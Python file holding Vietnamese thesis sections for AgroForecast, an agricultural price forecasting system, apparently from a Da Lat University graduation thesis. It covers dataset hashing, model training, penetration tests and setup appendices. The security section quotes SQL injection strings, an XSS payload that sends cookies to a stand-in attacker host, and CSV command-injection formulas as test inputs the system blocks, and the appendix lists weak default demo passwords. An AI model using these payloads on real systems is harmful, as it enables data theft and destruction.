# -*- coding: utf-8 -*-
"""
Phần 8: Đặc tả chi tiết thuật toán cài đặt trong mã nguồn, phân tích từng lớp bảo mật OWASP
và Phụ lục hướng dẫn triển khai & đóng gói đĩa DVD theo chuẩn Khoa CNTT - Trường Đại học Đà Lạt.
"""

CH3_ALGORITHM_PSEUDOCODE_SECTIONS = [
    {
        "code": "3.2.5.",
        "title": "Thiết kế thuật toán kiểm định nguồn gốc dữ liệu và chữ ký băm mật mã SHA-256 (Dataset Fingerprint)",
        "paragraphs": [
            "Một trong những đóng góp kỹ thuật cốt lõi của hệ thống AgroForecast tại tệp app/services/history_service.py là cơ chế bảo vệ tính toàn vẹn của dữ liệu chuỗi thời gian từ khâu thu thập cho đến khâu hiển thị dự báo. Thuật toán hoạt động qua ba bước kiểm soát tuần tự:",
            "Bước 1 - Lọc và phân đoạn chuỗi hợp lệ (modeling_rows): Truy vấn toàn bộ các bản ghi trong bảng price_history (hoặc periodic_prices đối với mía đường) của mặt hàng mục tiêu có trạng thái provenance nằm trong tập hợp ('collected', 'reviewed') và giá trị price > 0, sắp xếp tăng dần theo ngày record_date. Nếu phát hiện khoảng cách giữa hai ngày quan sát liên tiếp vượt quá ngưỡng gián đoạn cho phép (gap_break = 45 ngày đối với chuỗi ngày hoặc 60 ngày đối với chuỗi không đều do ngưng công bố dài hạn), thuật toán tự động tách chuỗi thành các phân đoạn độc lập (segments) và chọn phân đoạn liên tục mới nhất đủ độ dài tối thiểu (min_points = 60 đối với chuỗi ngày, 30 đối với chuỗi không đều, 24 đối với chuỗi kỳ) để huấn luyện.",
            "Bước 2 - Tính chữ ký băm mật mã SHA-256 (fingerprint): Với tập hợp các quan sát hợp lệ R = {(d_1, p_1, prov_1), ..., (d_N, p_N, prov_N)}, hàm fingerprint(R) nối chuẩn hóa toàn bộ chuỗi ngày, giá trị giá chính xác tới 4 chữ số thập phân và trạng thái xác minh thành một thông điệp duy nhất M = 'd_1:p_1:prov_1|d_2:p_2:prov_2|...|d_N:p_N:prov_N', sau đó áp dụng hàm băm mật mã một chiều SHA-256 (hashlib.sha256) để sinh ra chuỗi định danh 64 ký tự thập lục phân dataset_hash.",
            "Bước 3 - Xác thực đồng bộ tại thời điểm truy vấn dự báo: Mỗi khi người dùng gọi API GET /api/v1/forecast, dịch vụ forecast_service.py tính toán lại fingerprint(context['rows']) trên dữ liệu lịch sử hiện tại và so sánh với trường dataset_hash được lưu trong bảng training_runs của phiên huấn luyện gần nhất. Nếu hai mã băm không trùng khớp (ví dụ Quản trị viên vừa sửa hoặc xóa một điểm giá lịch sử), hệ thống lập tức chặn việc trả về dự báo cũ và yêu cầu kích hoạt lại tiến trình huấn luyện (HTTP 409 Conflict). Cơ chế này đảm bảo 100% đường dự báo hiển thị trên giao diện luôn tương ứng chính xác với tập dữ liệu lịch sử đã xác minh.",
        ],
    },
    {
        "code": "3.2.6.",
        "title": "Thiết kế quy trình huấn luyện đồng thời 5 mô hình và đối sánh với mô hình cơ sở (Naive Baseline)",
        "paragraphs": [
            "Trong tệp app/services/training_service.py, hàm retrain(commodity_id, progress) điều phối toàn bộ chu trình huấn luyện và kiểm định chéo cho 5 mô hình học máy ('LSTM', 'Prophet', 'ARIMA', 'XGBoost', 'Random Forest') theo 5 bước chuẩn hóa:",
            "Bước 1: Trích xuất chuỗi thời gian chuẩn hóa S = {p_1, p_2, ..., p_N} từ hàm training_context(). Kiểm tra điều kiện sẵn sàng quality['ready'] == True.",
            "Bước 2: Chia chuỗi S thành Tập huấn luyện S_train có độ dài N - H và Tập kiểm thử giữ lại S_test có độ dài H = min(14, max(5, floor(N / 6))). Tuyệt đối không cho phép các hàm huấn luyện đọc bất kỳ điểm dữ liệu nào thuộc S_test.",
            "Bước 3: Thiết lập dự báo cơ sở Naive Persistence Baseline trên tập S_test bằng cách giữ nguyên giá trị cuối cùng của tập huấn luyện: hat{y}_{naive} = [S_train[-1], S_train[-1], ..., S_train[-1]] và tính bộ chỉ số cơ sở (MAE_baseline, RMSE_baseline, MAPE_baseline, R2_baseline).",
            "Bước 4: Lần lượt huấn luyện từng mô hình m trong 5 mô hình trên chuỗi S_train, dự báo H bước trên tập S_test để tính toán chính xác bộ chỉ số kiểm định Metrics(m) = {MAE_m, RMSE_m, MAPE_m, R2_m}. Ngay sau khi kiểm định xong mô hình m, tiến hành huấn luyện lại mô hình m trên toàn bộ chuỗi S (gồm đủ N quan sát) để dự báo H_future = 30 bước tương lai {hat{y}_{N+1}^{(m)}, ..., hat{y}_{N+30}^{(m)}} và tính khoảng tin cậy 95% với bán kính dải băng Margin_m = 1.96 * RMSE_m.",
            "Bước 5: Khởi tạo bản ghi TrainingRun lưu trữ toàn bộ siêu dữ liệu kiểm định, chữ ký dataset_hash, kết quả so sánh với Naive Baseline và ghi đồng loạt 150 bản ghi dự báo mới (5 mô hình x 30 bước tương lai) vào bảng forecasts trong cùng một giao dịch nguyên tử (Database Transaction).",
        ],
    },
]

CH4_SECURITY_CODE_ANALYSIS = [
    {
        "code": "4.3.4.",
        "title": "Phân tích chi tiết kịch bản kiểm thử thâm nhập (Penetration Testing) trên từng lỗ hổng OWASP",
        "paragraphs": [
            "Để chứng minh hệ thống không chỉ cài đặt bảo mật trên lý thuyết mà thực sự chống chịu được các cuộc tấn công thực tế, dưới đây là phân tích chi tiết cơ chế hoạt động của 6 nhóm kịch bản tấn công giả lập trong tệp backend/tests/test_security_phase7.py và backend/tests/test_auth.py:",
            "1. Kịch bản tấn công giả mạo chữ ký số và dùng lại JWT hết hạn (test_jwt_tampering_expiration_and_alg_none): Bài kiểm thử tạo ra một JWT hợp lệ với quyền role='admin', sau đó thực hiện 3 hành vi tấn công: (a) Thay đổi 5 ký tự cuối của phần chữ ký điện tử (Signature Tampering: token[:-5] + 'ABCDE'); (b) Tạo một token có thời gian sống âm (expires_delta = timedelta(seconds=-10)) để giả lập token đã hết hạn; và (c) Dùng một khóa bí mật giả mạo của kẻ tấn công để tự ký một payload {'sub': '1', 'role': 'admin'}. Trong cả 3 trường hợp, hàm decode_access_token() sử dụng PyJWT kiểm tra chữ ký HMAC-SHA256 đều phát hiện sai lệch và trả về None, buộc tầng Dependency chặn truy cập với mã HTTP 401 Unauthorized.",
            "2. Kịch bản tấn công leo thang đặc quyền ngang và dọc (test_rbac_privilege_escalation_defense & test_lock_rejects_existing_token): Hệ thống tạo một tài khoản nông dân thông thường (normal_farmer@agro.vn, role='user'), đăng nhập lấy Bearer Token hợp lệ rồi dùng chính Token này gửi yêu cầu POST tới /api/v1/admin/tasks/scrape (chạy Bot cào dữ liệu), POST /api/v1/admin/tasks/retrain (huấn luyện lại AI), GET /api/v1/admin/users (xem danh sách tài khoản) và DELETE /api/v1/admin/prices/1 (xóa giá lịch sử). Kết quả thực nghiệm: 100% yêu cầu trái thẩm quyền bị bộ kiểm tra require_role(['admin']) chặn đứng với mã HTTP 403 Forbidden. Đặc biệt, kịch bản test_lock_rejects_existing_token kiểm chứng rằng ngay giây phút Admin khóa một tài khoản, mọi JWT Token đã cấp trước đó của tài khoản đó dù chưa hết hạn cũng bị vô hiệu hóa tức thời.",
            "3. Kịch bản tấn công tiêm mã lệnh SQL Injection đa biến thể (test_sql_injection_defense_in_commodity_query): Bài kiểm thử bắn liên tiếp 3 payload SQLi kinh điển vào tham số truy vấn của API: (a) Tấn công vượt điều kiện logic: COFFEE' OR '1'='1; (b) Tấn công ghép câu lệnh phá hủy bảng (Stacked Query): RICE'; DROP TABLE price_history; --; và (c) Tấn công trích xuất bảng người dùng (UNION-based SQLi): 1 UNION SELECT null, email, password_hash FROM users--. Nhờ SQLAlchemy ORM biên dịch tham số thành biến ràng buộc (Bound Parameters), cơ sở dữ liệu xử lý toàn bộ chuỗi độc hại như một hằng chuỗi thông thường, trả về mã an toàn và bảo toàn nguyên vẹn 100% dữ liệu bảng.",
            "4. Kịch bản tấn công chèn kịch bản độc hại Stored XSS & CSV Macro Injection (test_xss_sanitization_in_alert_creation & test_csv_formula_injection_defense): Kẻ tấn công gửi mã độc <script>fetch('http://hacker.site/steal?c='+document.cookie)</script> vào trường tên quy tắc cảnh báo tại API POST /api/v1/alerts. Trước khi lưu vào bảng alert_rules, hàm sanitize_text() đã tước bỏ toàn bộ cặp thẻ <script>...</script>, chỉ giữ lại nội dung văn bản sạch. Tương tự, khi nhập file CSV chứa công thức thực thi lệnh hệ điều hành =cmd|' /C calc'!A0 hoặc @SUM(1+1)*cmd|' /C calc'!A0, hàm sanitize_csv_cell() tự động gắn dấu nháy đơn (') ở đầu chuỗi ('=cmd..., '@SUM...), vô hiệu hóa hoàn toàn khả năng tự động chạy macro khi người dùng mở báo cáo trên Microsoft Excel.",
        ],
    },
]

APPENDIX_CONTENT = [
    (
        "PHỤ LỤC 1: HƯỚNG DẪN CÀI ĐẶT VÀ VẬN HÀNH HỆ THỐNG AGROFORECAST (PHỤC VỤ THƯ MỤC SETUP TRÊN ĐĨA DVD)",
        [
            "1. Yêu cầu môi trường cài đặt tối thiểu:",
            "- Hệ điều hành: Windows 10/11 (64-bit), macOS hoặc Ubuntu Linux 20.04+.",
            "- Trình thông dịch Python: Phiên bản Python 3.11 trở lên (khuyến nghị 3.11.9).",
            "- Môi trường Node.js: Phiên bản Node.js 18.x hoặc 20.x LTS trở lên kèm trình quản lý gói npm.",
            "- Hệ quản trị Cơ sở dữ liệu: PostgreSQL 14 hoặc PostgreSQL 15 trở lên (chạy tại cổng mặc định 5432).",
            "2. Quy trình 4 bước khởi tạo Cơ sở dữ liệu và chạy hệ thống:",
            "- Bước 1 (Khởi tạo CSDL PostgreSQL): Mở pgAdmin 4 hoặc công cụ dòng lệnh psql, tạo cơ sở dữ liệu mới có tên 'agroforecast_db' (UTF-8) và chạy tập tin kịch bản khởi tạo cấu trúc bảng kèm dữ liệu mẫu tại đường dẫn: database/init.sql.",
            "- Bước 2 (Cài đặt và khởi chạy máy chủ Backend FastAPI tại cổng 8000): Mở cửa sổ Terminal tại thư mục backend/, kích hoạt môi trường ảo Python (.\\venv\\Scripts\\activate), cài đặt các gói thư viện (pip install -r requirements.txt) và khởi chạy máy chủ API bằng lệnh: python -m uvicorn app.main:app --host 127.0.0.1 --port 8000. Truy cập tài liệu Swagger UI tương tác tại địa chỉ: http://127.0.0.1:8000/docs.",
            "- Bước 3 (Cài đặt và khởi chạy giao diện Frontend Next.js tại cổng 3000): Mở cửa sổ Terminal thứ hai tại thư mục frontend/, cài đặt các gói phụ thuộc (npm install) và chạy lệnh khởi động giao diện: npm run dev. Mở trình duyệt Web truy cập địa chỉ: http://localhost:3000.",
            "- Bước 4 (Chạy kiểm chứng bộ 125 kịch bản Pytest Backend & Bandit SAST): Tại thư mục backend/, thực thi lệnh: .\\venv\\Scripts\\pytest.exe -v && .\\venv\\Scripts\\bandit.exe -r app -ll && .\\venv\\Scripts\\bandit.exe -r ml_pipeline -ll (125/125 PASSED, 0 lỗi Medium/High). Hỗ trợ khởi chạy 1 chạm bằng Docker Compose: docker compose up --build.",
            "3. Tài khoản thử nghiệm mặc định phục vụ Hội đồng chấm khóa luận:",
            "- Tài khoản Quản trị viên (Admin): Email: admin@agroforecast.vn | Mật khẩu: admin123",
            "- Tài khoản Chuyên viên phân tích (Analyst): Email: anhnguyen@agroforecast.vn | Mật khẩu: 123456",
        ],
    ),
    (
        "PHỤ LỤC 2: CẤU TRÚC ĐÓNG GÓI ĐĨA DVD NỘP KHÓA LUẬN THEO QUY ĐỊNH KHOA CNTT - ĐH ĐÀ LẠT",
        [
            "Tuân thủ nghiêm ngặt Mục 4.3 của văn bản 'Một số qui định về hình thức trình bày Khóa luận tốt nghiệp - Khoa Công nghệ Thông tin - Trường Đại học Đà Lạt', toàn bộ sản phẩm của khóa luận được tổ chức chuẩn hóa theo cây thư mục đĩa DVD như sau:",
            "- Thư mục gốc đĩa DVD chứa tập tin HUONG_DAN_SU_DUNG_DIA_DVD.txt ghi rõ hướng dẫn cài đặt nhanh, danh mục tài khoản đăng nhập thử nghiệm và thông tin liên lạc đầy đủ của tác giả khóa luận (Họ tên, MSSV, Email, Số điện thoại).",
            "- Thư mục THESIS/: Chứa tập tin văn bản Khóa luận tốt nghiệp định dạng Microsoft Word (KHOA_LUAN_TOT_NGHIEP_AGROFORECAST_DLU.docx) đã định dạng chuẩn Times New Roman 13pt, giãn dòng 1.5 lines, căn lề chuẩn (Trái 3.5cm, Phải 2.0cm, Trên 2.5cm, Dưới 2.5cm) và tập tin trình chiếu bảo vệ trước Hội đồng (.pptx).",
            "- Thư mục AgroForecast/SETUP/: Chứa tập tin hướng dẫn cài đặt chi tiết, sơ đồ triển khai hệ thống, tập tin requirements.txt, package.json và bộ dữ liệu thử nghiệm CSV khớp chính xác với các bảng kết quả báo cáo trong Chương 4 của khóa luận.",
            "- Thư mục AgroForecast/SOURCE/: Chứa toàn bộ mã nguồn chương trình sạch gồm docker-compose.yml, thư mục backend/ (FastAPI, SQLAlchemy, ml_pipeline 5 mô hình AI tích hợp biến ngoại sinh USD/VND + WTI và bộ 125 kịch bản Pytest) và thư mục frontend/ (Next.js 14 TypeScript UI + Syncfusion EJ2).",
            "- Thư mục AgroForecast/DATABASE/: Chứa tập tin kịch bản khởi tạo cấu trúc 11 bảng CSDL (init.sql), công cụ sinh sơ đồ thực thể kết hợp (generate_erd.py) và bản sao lưu dữ liệu lịch sử 8 mặt hàng nông sản Việt Nam.",
        ],
    ),
]
